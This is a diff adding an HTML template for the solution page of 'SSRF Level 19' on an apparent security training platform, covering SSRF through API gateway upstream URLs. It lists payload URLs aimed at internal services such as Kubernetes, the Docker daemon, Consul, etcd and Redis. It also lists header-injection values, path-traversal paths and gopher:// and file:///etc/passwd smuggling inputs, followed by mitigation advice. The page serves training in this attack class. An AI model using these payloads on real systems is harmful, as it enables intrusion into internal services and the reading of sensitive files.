@@ -1,0 +1,173 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 19 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 19 Solution: SSRF in API Gateway</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF vulnerabilities in API gateway routing configurations, where upstream service URLs can be manipulated to access internal microservices and APIs.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand API gateway architecture:</strong> Routing, load balancing, service discovery</li>
+                    <li><strong>Identify routing parameters:</strong> Upstream URLs, service endpoints</li>
+                    <li><strong>Manipulate routing rules:</strong> Point to internal microservices</li>
+                    <li><strong>Access internal APIs:</strong> Bypass gateway security controls</li>
+                </ol>
+
+                <h4>API Gateway SSRF Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Basic internal service targeting
+API Endpoint: /api/v1/proxy
+Upstream URL: http://localhost:8080/admin
+
+# Internal microservice access
+API Endpoint: /api/v1/forward
+Upstream URL: http://user-service.internal:3000/users
+
+# Admin panel access via gateway
+API Endpoint: /api/proxy
+Upstream URL: http://admin.internal.local:8080/dashboard
+
+# Database service targeting
+API Endpoint: /api/v1/data
+Upstream URL: http://127.0.0.1:5432/postgres
+
+# Internal API discovery
+API Endpoint: /api/v1/route
+Upstream URL: http://service-discovery.internal:8500/v1/catalog/services</code></pre>
+                    </div>
+                </div>
+
+                <h4>API Gateway Exploitation Techniques:</h4>
+                <ul>
+                    <li><strong>Upstream manipulation:</strong> Redirect requests to internal services</li>
+                    <li><strong>Service discovery abuse:</strong> Enumerate internal microservices</li>
+                    <li><strong>Load balancer bypass:</strong> Direct access to backend services</li>
+                    <li><strong>Authentication bypass:</strong> Skip gateway-level authentication</li>
+                </ul>
+
+                <h4>Microservices Architecture Targeting:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Service mesh exploitation
+Upstream URL: http://istio-proxy:15000/config_dump
+Upstream URL: http://envoy-admin:9901/stats
+
+# Container orchestration APIs
+Upstream URL: http://kubernetes.default.svc.cluster.local:443/api/v1/pods
+Upstream URL: http://docker-daemon:2375/containers/json
+
+# Internal service discovery
+Upstream URL: http://consul.service.consul:8500/v1/kv/
+Upstream URL: http://etcd.internal:2379/v2/keys/
+
+# Database and cache services
+Upstream URL: http://redis.internal:6379/info
+Upstream URL: http://mongodb.internal:27017/admin</code></pre>
+                    </div>
+                </div>
+
+                <h4>API Gateway Security Bypass:</h4>
+                <ul>
+                    <li><strong>Rate limiting bypass:</strong> Direct backend access</li>
+                    <li><strong>WAF evasion:</strong> Skip gateway-level filtering</li>
+                    <li><strong>Authentication bypass:</strong> Access unprotected internal APIs</li>
+                    <li><strong>Authorization bypass:</strong> Escalate privileges via internal services</li>
+                </ul>
+
+                <h4>Common API Gateway Platforms:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Kong API Gateway
+Upstream URL: http://kong-admin:8001/services
+Upstream URL: http://internal-service:8000/api
+
+# AWS API Gateway
+Upstream URL: http://lambda.internal.amazonaws.com/invoke
+Upstream URL: http://internal-alb.us-east-1.elb.amazonaws.com
+
+# NGINX Plus
+Upstream URL: http://nginx-plus:8080/api/status
+Upstream URL: http://backend.internal:80/health
+
+# Istio Service Mesh
+Upstream URL: http://istio-pilot:15010/debug/endpointz
+Upstream URL: http://internal-service.default.svc.cluster.local:8080</code></pre>
+                    </div>
+                </div>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>API testing tools:</strong> Postman, Insomnia, curl</li>
+                    <li><strong>Gateway configuration tools:</strong> Kong Admin API, AWS CLI</li>
+                    <li><strong>Service discovery tools:</strong> Consul CLI, etcdctl</li>
+                    <li><strong>Microservice scanners:</strong> Custom scripts, Burp Suite</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Complete bypass of API gateway security controls</li>
+                    <li>Direct access to internal microservices</li>
+                    <li>Service discovery and architecture enumeration</li>
+                    <li>Potential data exfiltration from backend services</li>
+                    <li>Administrative interface access</li>
+                </ul>
+
+                <h4>Real-World Examples:</h4>
+                <ul>
+                    <li><strong>Netflix Zuul:</strong> Routing filter vulnerabilities</li>
+                    <li><strong>Spring Cloud Gateway:</strong> Predicate manipulation</li>
+                    <li><strong>Ambassador:</strong> Mapping configuration bypass</li>
+                    <li><strong>Traefik:</strong> Dynamic routing exploitation</li>
+                </ul>
+
+                <h4>Advanced Exploitation:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Header injection for internal routing
+X-Forwarded-Host: internal.admin.local
+X-Real-IP: 127.0.0.1
+X-Forwarded-For: 192.168.1.100
+
+# Path traversal in routing
+/api/v1/../admin/users
+/api/v1/proxy/../../internal/config
+
+# Protocol smuggling via gateway
+Upstream URL: gopher://internal.redis:6379/_INFO
+Upstream URL: file:///etc/passwd</code></pre>
+                    </div>
+                </div>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Implement strict upstream URL validation</li>
+                    <li>Use allowlists for permitted backend services</li>
+                    <li>Implement proper authentication at gateway level</li>
+                    <li>Monitor and log all routing decisions</li>
+                    <li>Use network segmentation for internal services</li>
+                    <li>Regular security audits of gateway configurations</li>
+                </ul>
+
+                <div class="alert alert-danger">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Critical Infrastructure Risk</h5>
+                    <p class="mb-0">API gateway SSRF can completely compromise microservices architecture security, providing attackers with direct access to internal systems that should be protected.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level19" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level20" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
